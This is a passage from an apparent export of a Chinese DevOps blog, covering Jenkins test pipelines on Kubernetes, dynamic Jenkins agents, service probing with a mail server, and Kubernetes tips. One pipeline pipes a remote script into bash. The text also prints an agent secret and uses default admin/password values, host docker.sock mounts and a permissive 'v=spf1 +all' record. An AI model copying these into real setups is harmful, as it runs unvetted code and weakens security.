测试、单元测试。测试并不是一项新技术，更多是产出与成本的一种平衡。\n如上图，是一个测试金字塔。越往上，需要的成本越高，对环境要求越高，执行时间越长，维护越麻烦，但更贴近终端用户的场景。在 《Google软件测试之道》中，按照谷歌的经验，各层测试用例比例是 70：20：10，也就是 70% 的单元测试，20% 的 API 测试，10% 的 UI 测试。\n本篇主要讲的是如何使用 Jenkins 在 Kubernetes 集群上运行自动化测试。在之前的文章中，已经涉及部分测试内容，比如单元测试、敏捷开发、Robotframework 等，在这里不会过多阐述。\n2. 单元测试 单元测试的运行频率非常高，每次提交代码都应该触发一次。单元测试的依赖少，通常只需要一个容器运行环境即可。\n下面是一个使用 golang:latest 跑单元测试的例子。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 pipeline { agent { kubernetes { label \u0026#39;unittest\u0026#39; yaml \u0026#39;\u0026#39;\u0026#39;apiVersion: v1 kind: Pod spec: containers: - name: golang image: golang:latest command: [\\\u0026#39;cat\\\u0026#39;] tty: true volumeMounts: - name: dockersock mountPath: /var/run/docker.sock - name: dockerbin mountPath: /usr/bin/docker volumes: - name: dockersock hostPath: path: /var/run/docker.sock - name: dockerbin hostPath: path: /usr/bin/docker \u0026#39;\u0026#39;\u0026#39; defaultContainer \u0026#39;golang\u0026#39; } } stages { stage(\u0026#39;testing\u0026#39;) { steps { sh \u0026#39;\u0026#39;\u0026#39; git clone https://github.com/etcd-io/etcd.git cd etcd make test \u0026#39;\u0026#39;\u0026#39; } } } } 执行日志：\n针对其他语言、框架，单元测试通过安装一些包、Mock 相关服务，也能够便捷地运行在 Kubernetes 上。更多可以挖掘的是写单元测试的技巧，而不是运行时和单元测试方案。\n3. API 测试 如果团队的自动化测试刚起步，API 自动化测试是非常好的切入点。\n单元测试主要由研发负责写。在快速迭代的过程中，有经验的研发也不会忘记写单元测试。重构、变更越快，测试不会成为负担，反而更重要。没有写单元测试，只能说其不被重视。推动一件不被执行者重视、管理者很难看到收益的事情是非常难的。\n而 UI 自动化测试常常又被人工测试替代。同时，维护 UI 自动化测试成本较高，在快速迭代的过程中，不应该过多地进行 UI 自动化测试。\nAPI 测试的优势在于，在前后端分离的架构下，API 相关的文档和资料相对完善，团队成员对 API 相对熟悉，有利于进行测试。\n下面是一个使用 Postman 进行 API 自动化测试的例子：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 pipeline { agent { kubernetes { label \u0026#39;apitest\u0026#39; yaml \u0026#39;\u0026#39;\u0026#39;apiVersion: v1 kind: Pod spec: containers: - name: newman image: postman/newman_alpine33 command: [\\\u0026#39;cat\\\u0026#39;] tty: true volumeMounts: - name: dockersock mountPath: /var/run/docker.sock - name: dockerbin mountPath: /usr/bin/docker volumes: - name: dockersock hostPath: path: /var/run/docker.sock - name: dockerbin hostPath: path: /usr/bin/docker \u0026#39;\u0026#39;\u0026#39; defaultContainer \u0026#39;newman\u0026#39; } } parameters { string(name: \u0026#39;HOST\u0026#39;, defaultValue: \u0026#39;10.10.10.10\u0026#39;, description: \u0026#39;\u0026#39;) string(name: \u0026#39;PORT\u0026#39;, defaultValue: \u0026#39;8000\u0026#39;, description: \u0026#39;\u0026#39;) string(name: \u0026#39;USERNAME\u0026#39;, defaultValue: \u0026#39;admin\u0026#39;, description: \u0026#39;\u0026#39;) string(name: \u0026#39;PASSWORD\u0026#39;, defaultValue: \u0026#39;password\u0026#39;, description: \u0026#39;\u0026#39;) } stages { stage(\u0026#39;testing\u0026#39;) { steps { sh \u0026#39;\u0026#39;\u0026#39; apk add --no-cache bash git openssh git clone https://yourdomain.com/ns/ks-api-test.git cd ks-api-test sed -i \u0026#34;s/__HOST__/$HOST/g\u0026#34; postman_environment.json sed -i \u0026#34;s/__PORT__/$PORT/g\u0026#34; postman_environment.json sed -i \u0026#34;s/__USERNAME__/$USERNAME/g\u0026#34; postman_environment.json sed -i \u0026#34;s/__PASSWORD__/$PASSWORD/g\u0026#34; postman_environment.json npm install -g newman-reporter-htmlextra newman run iam/postman_collection.json -e postman_environment.json -r htmlextra \u0026#39;\u0026#39;\u0026#39; } } } post { always { archiveArtifacts \u0026#39;ks-api-test/newman/*\u0026#39; } } } 执行后的归档：\n查看报告：\nAPI 自动化测试的框架很容易实现，实现几点功能即可：\n接口请求 响应断言 请求编排 生成报告 但一定要根据团队的 API 测试、交付习惯选择合适的方案。可以自己开发，也可以使用现有的工具。上面选择的是 Postman + Newman 的方案，原因是团队普遍都使用 Postman 进行 API 测试。\n剩下的就是如何组织大家进行测试，可以分别提交文件到一个共同的仓库，也可以使用付费版 Postman 共享数据集中测试。\n4. UI 测试 UI 自动化测试的成本高有几个方面：\n测试用例难维护。前端样式变化、产品逻辑变化。 很难提供稳定的运行环境。各种超时、脏数据会导致失败率很高。 这里的 UI 自动化测试，采用的是我熟悉的 Robotframework 框架，使用关键字进行自动化测试。相关文档可以参考，如何打包一个 Robot Framework 的 Docker 镜像\n。\n下面是一个使用 Robotframework 进行 UI 自动化测试的例子：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 pipeline { agent { kubernetes { label \u0026#39;robotframework\u0026#39; yaml \u0026#39;\u0026#39;\u0026#39;apiVersion: v1 kind: Pod spec: containers: - name: robotframework image: shaowenchen/docker-robotframework:latest tty: true volumeMounts: - name: dockersock mountPath: /var/run/docker.sock - name: dockerbin mountPath: /usr/bin/docker volumes: - name: dockersock hostPath: path: /var/run/docker.sock - name: dockerbin hostPath: path: /usr/bin/docker \u0026#39;\u0026#39;\u0026#39; defaultContainer \u0026#39;robotframework\u0026#39; } } parameters { string(name: \u0026#39;HOST\u0026#39;, defaultValue: \u0026#39;10.10.10.10\u0026#39;, description: \u0026#39;\u0026#39;) string(name: \u0026#39;PORT\u0026#39;, defaultValue: \u0026#39;8080\u0026#39;, description: \u0026#39;\u0026#39;) string(name: \u0026#39;USERNAME\u0026#39;, defaultValue: \u0026#39;admin\u0026#39;, description: \u0026#39;\u0026#39;) string(name: \u0026#39;PASSWORD\u0026#39;, defaultValue: \u0026#39;password\u0026#39;, description: \u0026#39;\u0026#39;) } stages { stage(\u0026#39;testing\u0026#39;) { steps { sh \u0026#39;\u0026#39;\u0026#39; curl -s -L https://raw.githubusercontent.com/shaowenchen/scripts/master/kubesphere/preinstall.sh | bash git clone https://yourdomain.com/ns/ks-ui-test.git cd ks-ui-test sed -i \u0026#34;s/__USERNAME__/$USERNAME/g\u0026#34; tests/common.robot sed -i \u0026#34;s/__PASSWORD__/$PASSWORD/g\u0026#34; tests/common.robot echo \u0026#34;\\nTestEnv http://$HOST:$PORT\u0026#34; \u0026gt;\u0026gt; tests/api.robot echo \u0026#34;\\nTestEnv http://$HOST:$PORT\u0026#34; \u0026gt;\u0026gt; tests/devops.robot ./start.sh\u0026#39;\u0026#39;\u0026#39; } } } post { always { sh \u0026#39;tar cvf report-$BUILD_NUMBER.tar ks-ui-test/tests/report\u0026#39; archiveArtifacts \u0026#39;*.tar\u0026#39; } } } 执行日志：\n测试报告：\n","description":"","id":343,"section":"post","tags":["博文","测试","自动化","Kubernetes","Jenkins","DevOps"],"title":"基于 Kubernetes 和 Jenkins 搭建自动化测试系统","uri":"https://www.chenshaowen.com/blog/build-an-automated-test-system-using-kubernetes-and-jenkins.html"},{"content":"1. Jenkins 的工作模式 Jenkins 是一个单 Master，多 Slave 架构。Master 负责分配任务、管理服务。 Slave 负责执行具体任务。\n即使部署了多个 Master，这些 Master 之间依然相互独立，无法协同调度。在高可用的 Jenkins 方案中，需要借助外部的任务分发框架，协调多 Master 之间的调度，比如，gearman。\n在每个 Master 节点上，安装 gearman 插件，连接到 gearman server。在 gearman server 的统一分发下，各个 Master 才能构成高可用的 Jenkins 应用。\n那么，Master 和 Slave 之间是如何通信的呢？主要有两种方式：ssh，jnlp。\nssh 模式 将 Master 的 SSH 公钥配置到所有的 Slave 上。当有任务调度时，由 Master 使用 ssh 客户端进行远程通信，启动 Agent 执行任务。\n在 【系统管理】-\u0026gt;【节点管理】-\u0026gt;【新建节点】页面中，启动方式选择 【Launch agent agents via SSH】，填入主机相关信息，保存即可。\njnlp 模式 在 Slave 上需要常驻一个守护进程 jnlp ，使用 HTTP 协议与 Master 进行通信。每个 jnlp 都需要配置一个单独的 secret。\n在 【系统管理】-\u0026gt;【节点管理】-\u0026gt;【新建节点】页面中，启动方式选择 【通过Jave Web启动代理】。保存之后，点击查看代理，可以看到启动节点命令：\n1 java -jar agent.jar -jnlpUrl http://dev.chenshaowen.com:8080/computer/jnlp%E6%A8%A1%E5%BC%8F/slave-agent.jnlp -secret 8c7f2a83ea2f29ab9e5427d137c324b8102dfab18f8750229e36e34839a9e9c8 -workDir \u0026#34;/data\u0026#34; 2. 安装 Kuernetes 和 Jenkins 安装不是本篇主要内容，这里主要提供相关文档或脚本，以保证内容连贯。\n2.1 Kubernetes 提供两种安装方式：\nKubeSpray 实际上 KubeSpray 也是使用 Kubeadm 进行安装，但 KubeSpray 提供了各种相关组件的集成。\nKubeadm 参考文档：使用 Kubeadm 安装 Kubernetes 集群\n2.2 Jenkins Jenkins 非常友好地提供了一个完整 war 包，有三种方式部署 Jenkins。\n直接在 Java 环境，运行 war 包 使用 Docker Compose 运行 在 Kubernetes 中部署 Jenkins，使用 yaml 文件或者 helm 包 这里，我使用的是 Docker Compose 的方式运行 Jenkins。其他方式类似，注意开放相关访问端口即可。\n3. 在 Kubernetes 动态创建 Slave 3.1 创建 ServiceAccount 为了使 Jenkins 有权限访问 Kubernetes 集群，这里我们需要创建一个 ServiceAccount。\n在 Kubernetes 集群主机上，创建文件 jenkins-rbac.yml。为了省略创建命名空间的步骤，这里 namespace 使用 default。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 apiVersion: v1 kind: ServiceAccount metadata: name: jenkins namespace: default --- apiVersion: rbac.authorization.k8s.io/v1beta1 kind: RoleBinding metadata: name: jenkins-rolebinding namespace: default roleRef: apiGroup: rbac.authorization.k8s.io kind: ClusterRole name: admin subjects: - kind: ServiceAccount name: jenkins namespace: default 创建 ServiceAccount\n1 kubectl apply -f jenkins-rbac.yml 获取访问 token\n1 kubectl describe secret 忽略 default-token-xxx，获取 jenkins-token-xxx 中的 token 值：\nName: jenkins-token-6vn2v Namespace: default Labels: \u0026lt;none\u0026gt; Annotations: kubernetes.io/service-account.name: jenkins kubernetes.io/service-account.uid: e1c181ae-ac1a-4ca8-b696-c06087b8c87c Type: kubernetes.io/service-account-token Data ==== token:[这里的值，需要配置在 Jenkins 中] ca.crt: 1025 bytes namespace: 7 bytes 3.2 安装插件 Kubernetes Plugin 在【系统管理】-\u0026gt;【插件管理】-\u0026gt;【可选插件】中，搜索 Kubernetes ，找到插件 Kubernetes plugin，安装并重启 Jenkins 即可。\n下图中已经安装插件，如果待安装，请选择【可选插件】Tab。\n3.3 插件配置 在【系统管理】-\u0026gt;【系统配置】中，滚动到页面底部，找到 cloud，新增加一个云。\nKubernetes 地址指的是 Apiserver 地址，Jenkins 地址指的是 Jenkins 页面的访问地址，Jenkins 通道指的是 jnlp 与 Jenkins 通信的地址，默认是 Master 的 50000 端口地址。\n在【凭据】中添加 Secret text 类型的凭据，内容填写上面获取的 token 值。\n凭证选择【jenkins-token】后，点击【连接测试】，提示 Connection test successful 则表示配置成功。最终配置参数如下图：\n3.4 创建任务 创建流水线类型的任务，将以下脚本粘贴在流水线的编辑框内，保存执行。\n使用 podTemplate 语法，进行构建 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 podTemplate(containers: [ containerTemplate(name: \u0026#39;maven\u0026#39;, image: \u0026#39;maven:3.3.9-jdk-8-alpine\u0026#39;, ttyEnabled: true, command: \u0026#39;cat\u0026#39;), containerTemplate(name: \u0026#39;golang\u0026#39;, image: \u0026#39;golang:1.8.0\u0026#39;, ttyEnabled: true, command: \u0026#39;cat\u0026#39;) ]) { node(POD_LABEL) { stage(\u0026#39;Maven project\u0026#39;) { container(\u0026#39;maven\u0026#39;) { stage(\u0026#39;Maven test\u0026#39;) { sh \u0026#39;mvn -version\u0026#39; } } } stage(\u0026#39;Golang project\u0026#39;) { container(\u0026#39;golang\u0026#39;) { stage(\u0026#39;Go test\u0026#39;) { sh \u0026#39;go version\u0026#39; } } } } } 执行日志：\n使用声明式语法，直接提供 Yaml 内容。也可以提供文件路径，指向 Yaml 文件。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 pipeline { agent { kubernetes { yaml \u0026#34;\u0026#34;\u0026#34; apiVersion: v1 kind: Pod metadata: labels: mylabel: myvalue spec: containers: - name: maven image: maven:3.3.9-jdk-8-alpine command: - cat tty: true - name: go image: golang:1.8.0 command: - cat tty: true \u0026#34;\u0026#34;\u0026#34; } } stages { stage(\u0026#39;Run maven\u0026#39;) { steps { container(\u0026#39;maven\u0026#39;) { sh \u0026#39;mvn -version\u0026#39; } container(\u0026#39;go\u0026#39;) { sh \u0026#39;go version\u0026#39; } } } } } 执行日志：\n4. 使用模板创建 Slave Kubernetes Plugin 提供的 podTemplate 十分的灵活，能够为 Jenkins 提供各种各样的工作节点。\n但是，如果每个流水线都需要这样配置模板，反而会变得十分繁琐。在 Kubernetes Plugin 中提供了内置的 podTemplate，当流水线配置的 agent label 与之匹配时，就可以直接用于 Pod 创建。\n4.1 配置 PodTemplate 在【系统管理】-\u0026gt;【系统配置】中，滚动到页面底部，找到 Pod Template，增加一个模板，填入相关信息。\n这里需要特别注意的是标签列表值。在流水线中，可以通过标签列表选中当前 Pod Template。\n如上图，如果仅增加 Python 容器，在流水线执行时，会一直等待调度。\nStarted by user admin Running in Durability level: MAX_SURVIVABILITY [Pipeline] Start of Pipeline [Pipeline] node Still waiting to schedule task ‘test-nqppr’ is offline 查看 Jenkins 的系统全局日志，可以发现：\nFailed to send back a reply to the request hudson.remoting.Request$2@693aae9b: hudson.remoting.ChannelClosedException: Channel \u0026#34;hudson.remoting.Channel@376b1008:JNLP4-connect connection from 172.17.0.1/172.17.0.1:56788\u0026#34;: channel is already closed 意思是 Pod 中没有 jnlp 与之通信。因此，除了运行时容器，还需要添加一个名为 jnlp 的容器用于与 Jenkins 通信。如下图：\n最终的效果是，一个 Pod 模板，包含一个或多个指定的运行时容器，加一个 jnlp 容器。\n如果没有填写 jnlp 容器，会自动创建 jnlp 容器，但有时会报错无法连接（可能是 Jenkins 的 Bug），所以建议显示指定一个 jnlp 容器。同时，jnlp 是默认容器，也就是没有被 container 包裹的运行环境都是 jnlp。为了方便，另外一种方案，就是定制 jnlp 。\n【非必须】如果需要 Pod 中的容器能够共享宿主机上的 Docker，也就是 docker in docker，可以在【卷】中添加一个 【Host Path Volume】，将所主机上的 /var/run/docker.sock 挂载到容器的 /var/run/docker.sock 上，如下图。\n4.2 创建模板任务 创建一个流水线任务 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 pipeline { agent { node { label \u0026#39;python\u0026#39; } } stages { stage(\u0026#39;Run Test\u0026#39;) { steps { container(\u0026#39;python\u0026#39;) { sh \u0026#39;python --version\u0026#39; } } } } } 执行日志：\n创建一个自由风格任务 构建中，选择【执行 shell】，填入如下内容：\n1 2 uname -a python --version 执行日志：\n可以看到 python --version 执行失败了。这是因为默认容器为 jnlp，而 jenkins/jnlp-slave:3.35-5-alpine 镜像中没有打包 python。这也意味着，这里仅能执行 jnlp 提供的命令。\n5. 参考 https://github.com/jenkinsci/kubernetes-plugin/blob/master/README_zh.md ","description":"","id":344,"section":"post","tags":["博文","Jenkins","Kubernetes"],"title":"在 Kubernetes 上动态创建 Jenkins Slave","uri":"https://www.chenshaowen.com/blog/creating-jenkins-slave-dynamically-on-kubernetes.html"},{"content":"1. 为什么要拨测 对于系统中的一些关键服务，我们通常会配置监控服务。当故障发生时，能够尽快被检测到，发送通知给关注人。当故障发生后，能够有效地追溯故障过程。\n拨测是监控系统中的一个重要环节，能够检测服务的网络质量，并提供实时告警。\n在公有云上，云厂商通过广泛分布的拨测节点，提供拨测服务。那么在 Jenkins 上如何实现拨测功能呢？\n2. 搭建邮件服务器 这里选择的是 Poste 邮件服务，邮件域名 mail.dev.chenshaowen.com。\n域名配置 mail.dev.chenshaowen.com -\u0026gt; A 记录 -\u0026gt; 主机 IP mail.dev.chenshaowen.com -\u0026gt; TXT 记录 -\u0026gt; v=spf1 +all _dmarc.mail.dev.chenshaowen.com -\u0026gt; TXT 记录 -\u0026gt; v=DMARC1;p=none 运行服务 创建数据存储目录 1 mkdir /maildata 以后台的方式运行 poste.io 1 2 3 4 5 6 7 8 9 10 11 12 13 14 docker run -d \\ -p 25:25 \\ -p 80:80 \\ -p 110:110 \\ -p 143:143 \\ -p 443:443 \\ -p 587:587 \\ -p 993:993 \\ -p 995:995 \\ -v /etc/localtime:/etc/localtime:ro \\ -v /maildata:/data \\ --name \u0026#34;mailserver\u0026#34; \\ -h \u0026#34;mail.dev.chenshaowen.com\u0026#34; \\ -t analogic/poste.io 服务配置，设置 IP 白名单 打开页面 https://mail.dev.chenshaowen.com:443 ，创建邮件账户。进入 Poste 的主页可以看到如下页面：\n这里需要将 Jenkins 运行的主机 IP 加入到白名单中，否则会有 550 报错。\n除此，在 /webmail/ 路由下，用户可以正常使用邮箱功能。\n3. 使用 Jenkins 进行拨测 快速部署 Jenkins 可以参考 Docker Compose 脚本。\n主要使用的功能包括：\n邮件通知 新建流水线 定时构建 3.1 开启邮件通知 在 Jenkins 的【系统管理】-\u0026gt;【系统配置】-\u0026gt;【邮件通知】中，配置邮件通知服务，如下图：\n填入服务相关信息之后，建议发送测试邮件，确保邮件功能正常。最后，保存即可。\n3.2 新建一个流水线 这里的拨测，主要分为服务状态码和响应时间两部分，分别由两个并行的 Stage 构成。\n测试的原理是，通过 curl 命令获取服务链接的状态码和响应时间，然后与预期值比较。如果满足触发条件，则发送异常通知邮件。\n下面是 Jenkinsfile 文件内容：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 pipeline { agent any parameters { string(name: \u0026#39;LINK\u0026#39;, defaultValue: \u0026#39;https://www.chenshaowen.com/\u0026#39;, description: \u0026#39;待拨测链接\u0026#39;) string(name: \u0026#39;HTTP_CODE\u0026#39;, defaultValue: \u0026#39;200\u0026#39;, description: \u0026#39;预期状态码\u0026#39;) string(name: \u0026#39;TIME_TOTAL\u0026#39;, defaultValue: \u0026#39;1\u0026#39;, description: \u0026#39;超时时间，单位：秒\u0026#39;) string(name: \u0026#39;EMAIL\u0026#39;, defaultValue: \u0026#39;admin@mail.dev.chenshaowen.com\u0026#39;, description: \u0026#39;异常时，邮件通知人\u0026#39;) } stages { stage(\u0026#39;default\u0026#39;) { parallel { stage(\u0026#39;状态测试\u0026#39;) { steps { script { try{ sh \u0026#39;\u0026#39;\u0026#39; export _HTTP_CODE=$(curl --connect-timeout 120 -s -o /dev/null -w \\\u0026#39;%{http_code}\\\u0026#39; $LINK) if [ \u0026#34;$_HTTP_CODE\u0026#34; != \u0026#34;$HTTP_CODE\u0026#34; ] then exit -1 fi \u0026#39;\u0026#39;\u0026#39; }catch(err){ currentBuild.result = \u0026#39;FAILURE\u0026#39; mail(subject: \u0026#34;$LINK 访问状态码错误\u0026#34;, body: \u0026#34;消息来自 DevOps 流水线，请检查相关服务是否异常。\u0026#34;, to: \u0026#34;$EMAIL\u0026#34;) } } } } stage(\u0026#39;超时测试\u0026#39;) { steps { script { try{ sh \u0026#39;\u0026#39;\u0026#39; _TIME_TOTAL=$(curl --connect-timeout 120 -s -o /dev/null -w \\\u0026#39;%{time_total}\\\u0026#39; $LINK) TIME_TOTAL=`echo $TIME_TOTAL| awk \u0026#39;{print int($0)}\u0026#39;` _TIME_TOTAL=`echo $_TIME_TOTAL| awk \u0026#39;{print int($0)}\u0026#39;` if [ $_TIME_TOTAL -ge $TIME_TOTAL ] then exit -1 fi \u0026#39;\u0026#39;\u0026#39; }catch(err){ currentBuild.result = \u0026#39;FAILURE\u0026#39; mail(subject: \u0026#34;$LINK 访问超时\u0026#34;, body: \u0026#34;消息来自 DevOps 流水线，请检查相关服务是否异常。\u0026#34;, to: \u0026#34;$EMAIL\u0026#34;) } } } } } } } } 新建一个【流水线】任务，点击【配置】，在【流水线】的脚本内容中粘贴上面的 Jenkinsfile 内容，保存即可。\n3.3 定时构建 成功创建拨测流水线之后，只能人工触发。拨测需要的是， 24 小时无间断地监控。这时，就需要使用到定时构建功能。\n在流水线页面，点击【配置】，找到【构建触发器】。勾选定时构建，设置每 5 分钟触发一次流水线，填入参数：\n1 */5 * * * * 最后，点击【确认】，保存即可。\n4. 测试拨测功能 4.1 SUCCESS 在流水线，直接使用预期的参数，进行测试。\n查看执行日志：\n4.2 FAILURE 这里有意地将状态码设置为 201，超时时间设置为 0 秒，以触发检查失败后的通知逻辑。\n查看执行日志：\n在邮件中，我们也可以看到告警邮件：\n","description":"","id":345,"section":"post","tags":["博文","Jenkins","拨测","邮件","Poste","DevOps"],"title":"使用 Jenkins 进行服务拨测","uri":"https://www.chenshaowen.com/blog/how-to-dial-up-testing-using-jenkins.html"},{"content":" 主要记录最近遇到的一些开发问题，解决方法。\n1. Kubernetes 服务仅在负载节点可用 正常情况下 NodePort 类型的 Service ，任意 Node 节点 IP + 端口，都可以访问。但是，也有可能仅负载的 Node 节点 IP + 端口可以访问。\n首先，可以尝试配置转发相关参数:\n1 2 3 4 5 6 cat \u0026lt;\u0026lt;EOF \u0026gt; /etc/sysctl.d/k8s.conf net.bridge.bridge-nf-call-ip6tables = 1 net.bridge.bridge-nf-call-iptables = 1 net.ipv4.ip_forward=1 vm.swappiness=0 EOF 1 sysctl --system 另外一种可能是防火墙，没有豁免 IPENCAP 协议：\nCalico 网络插件，有两种模式 BGP 、IPIP。使用 IPIP 模式时，需要在防火墙中，开启 IPENCAP 协议。\n2. /var/lib/docker 目录迁移或扩容 停止相关服务，保证数据一致性 1 service docker stop 备份数据 1 mv /var/lib/docker /var/lib/docker_bk 迁移数据 1 2 3 4 mkdir -p /data/docker/ rsync -avz /var/lib/docker_bk/ /data/docker/ du -h --max-depth=0 /data/docker ln -s /data/docker /var/lib/docker 重启相关服务 1 service docker start 3. kubectl 获取全部使用的镜像 1 kubectl get pod --all-namespaces -o=jsonpath=\u0026#39;{range .items[*]}{range .spec.containers[*]}{.image}{\u0026#34;\\n\u0026#34;}{end}{range .spec.initContainers[*]}{.image}{\u0026#34;\\n\u0026#34;}{end}{end}\u0026#39; | sort -u 4. 使用 Telepresence 远程调用 Kubernetes Telepresence 是 CNCF 基金会下的一个项目。它的工作原理是在本地和 Kubernetes 集群之间，搭建一个透明的双向代理。\n使用 Telepresence 可以实现的功能：\n本地的服务就可以完整的访问到远程集群中的其他服务。 本地的服务直接访问到 Kubernetes 里的各种资源，包括环境变量、Secrets、ConfigMap 等。 集群直接访问到本地暴露出来的接口。 kubectl 安装配置。 在本地，安装并配置 kubectl ，使其可以正常访问 Kubernetes 集群。\n安装 Telepresence 1 2 brew cask install osxfuse brew install datawire/blackbird/telepresence 本地连通远程分支 1 telepresence 本地访问远程集群服务 找到服务域名：\n1 kubectl get svc 1 2 3 NAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE kubernetes ClusterIP 10.233.0.1 \u0026lt;none\u0026gt; 443/TCP 2h myservice ClusterIP 10.233.4.163 \u0026lt;none\u0026gt; 8000/TCP 2m 打开本地任意 Console ，即可直接访问集群内部服务：\n1 curl http://myservice:8000 1 Hello, world! 远程集群访问本地服务 远程集群通过端口 8000 ，访问本地 8080 端口服务，有两种方式：\n新建 Deployment 1 telepresence --new-deployment new_deploy_name --expose 8080:8000 替换已经存在的 Deployment 1 telepresence --swap-deployment existed_deploy_name --expose 8080:8000 ","description":"","id":346,"section":"post","tags":["博文","Tips","Kubernetes"],"title":"开发 Tips（16）","uri":"https://www.chenshaowen.com/blog/developing-tips-16.html"},{"content":"1. 自动签发 Ingress 证书 安装 cert-manager 1 2 3 4 5 6 7 8 9 10 kubectl apply -f https://raw.githubusercontent.com/jetstack/cert-manager/release-0.10/deploy/manifests/00-crds.yaml kubectl create namespace cert-manager kubectl label namespace cert-manager certmanager.k8s.io/disable-validation=true helm repo add jetstack https://charts.jetstack.io helm repo update helm install \\ --name cert-manager \\ --namespace cert-manager \\ --version v0.10.0 \\ jetstack/cert-manager 创建一个全局的签发机构 新建文件 issuer.yaml\n1 2 3 4 5 6 7 8 9 10 11 12 apiVersion: certmanager.k8s.io/v1alpha1 kind: ClusterIssuer metadata: name: letsencrypt-prod namespace: cert-manager spec: acme: server: https://acme-v02.api.letsencrypt.org/directory email: admin@domain.com privateKeySecretRef: name: letsencrypt-prod http01: {} 创建签发机构\n1 kubectl apply -f issuer.yaml 签发证书 新建文件 cert.yaml\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 apiVersion: certmanager.k8s.io/v1alpha1 kind: Certificate metadata: name: ingress-cert-name namespace: app-namespace spec: secretName: ingress-cert-app issuerRef: name: letsencrypt-prod kind: ClusterIssuer dnsNames: - ingress-app.domain.com acme: config: - http01: ingressClass: traefik domains: - ingress-app.domain.com 签发证书\n1 kubectl apply -f cert.yaml 2. Kubernetes 常见故障排查 2.1 Node 异常 故障可能：\nkubelet 进程异常 未安装 cni 插件 docker 异常 磁盘空间不足 内存不足 定位方式：\nkubectl describe node ，查看节点事件 systemctl status kubelet ，查看 kubelet 状态 journalctl -u kubelet -f ，查看系统日志 top，查看系统 cpu、内存占用情况 du -sh、df -h，查看磁盘使用情况 2.2 Pod 异常 Pod 可能处于三种非正常运行状态，长时间 Pending、Waiting、CrashBackoff\nPending kubectl describe pod，查看事件。\n可能原因：可用资源不足、不满足亲和性策略，节点 taints 不允许调度\nWaiting 可能原因：镜像拉取失败。请尝试人工拉取镜像，检查镜像名、权限、网络是否符合预期。\nCrashBackoff 可能原因：服务启动失败，依赖不能完全满足。请查看 kubectl logs 日志，或进入 Pod 、Docker 调试。\n2.3 Service 异常 endpoint 未正常添加 可能原因：Pod 异常或选择器没有选中任何 Pod。检查 service 的选择器配置；执行 kubectl describe service\\endpoints\\pod 查看是否有异常事件。\nservice 端口映射错误 检查 service 端口映射，是否与 Pod 端口、访问的端口一致。\n网络配置问题 检查 kube-proxy 、iptables 或 ipvs 是否异常。\n3. 参考 https://github.com/jetstack/cert-manager/issues/2109 ","description":"","id":347,"section":"post","tags":["博文","Kubernetes","证书","故障","Ingress"],"title":"Kubernetes 签发 Ingress 证书及日常故障运维","uri":"https://www.chenshaowen.com/blog/kubernetes-ingress-certificates-and-ops.html"},{"content":" Deployment 通过创建 ReplicaSet 控制 Pod 的数量、状态。本篇主要介绍一些 Deployment 常用的操作。\n1. Deployment yaml 格式 带上 --dry-run 参数表示并不执行命令，仅生成 yaml 输出：\n1 kubectl create deployment nginx --image=nginx --dry-run -o yaml apiVersion: apps/v1 kind: Deployment metadata: creationTimestamp: null labels: app: nginx name: nginx spec: replicas: 1 selector: matchLabels: app: nginx strategy: {} template: metadata: creationTimestamp: null labels: app: nginx spec: containers: - image: nginx name: nginx resources: {} status: {} 2. 创建 使用 run 参数 1 kubectl run nginx --image=nginx 使用 create 参数 kubectl create deployment nginx --image=nginx 直接使用 yaml 文件 为了提高编辑效率，通常会基于已有的 Deployment yaml 进行编辑。比如，先执行 kubectl create deployment nginx --image=nginx --dry-run -o yaml \u0026gt; deployment.yaml，再编辑镜像、副本数等信息。\n1 kubectl apply -f deployment.yaml 3. 升级更新 更新镜像版本 1 kubectl set image deployment/nginx nginx=nginx:1.9.1 限制内存和 CPU 的使用 1 kubectl set resource deployment/nginx -c=nginx --limits=cpu=200m,memory=512Mi 直接修改 yaml 文件 使用 edit 命令，能够直接对已经创建的 Kubernetes 对象进行编辑，保存退出后，立即生效。\n1 kubectl edit deployment nginx 4. 滚动策略 在 spec 字段中，可以配置滚动升级策略：\n1 2 3 4 5 6 spec: strategy: rollingUpdate: maxSurge: 25% # 最大额外副本比例 maxUnavailable: 25% # 最少不可以副本比例 type: RollingUpdate 暂停 Deployment 更新 1 kubectl rollout pause deployment/nginx 恢复 Deployment 更新 1 kubectl rollout resume deployment/nginx 回滚 Deployment 到指定版本 1 kubectl rollout undo deployment/nginx --to-revision=2 查看 Deployment 滚动状态 1 kubectl rollout status deployment/nginx 查看 Deployment 历史版本 1 kubectl rollout history deployment/nginx 5. 弹性伸缩 手动修改副本数量 1 kubectl scale deployment/nginx --replicas=3 自动扩缩容副本数量 集群的 Horizontal Pod Autoscaler 功能，依赖于聚合器提供的监控数据。Metrics Server 是集群的核心监控数据的聚合器，从 Kubelet 中采集指标数据。\n新建 metrics-server.yaml 文件，内容如下：\n1 2 3 4 args: - --logtostderr - --kubelet-insecure-tls - --kubelet-preferred-address-types=InternalIP 安装 Metric Server 服务\n1 2 3 4 helm install stable/metrics-server \\ -n metrics-server \\ --namespace kube-system \\ -f metrics-server.yaml 查看资源使用情况\n1 2 3 kubectl top node NAME CPU(cores) CPU% MEMORY(bytes) MEMORY% i-d7uwk2b1 443m 5% 5213Mi 67% 根据现有 Pod 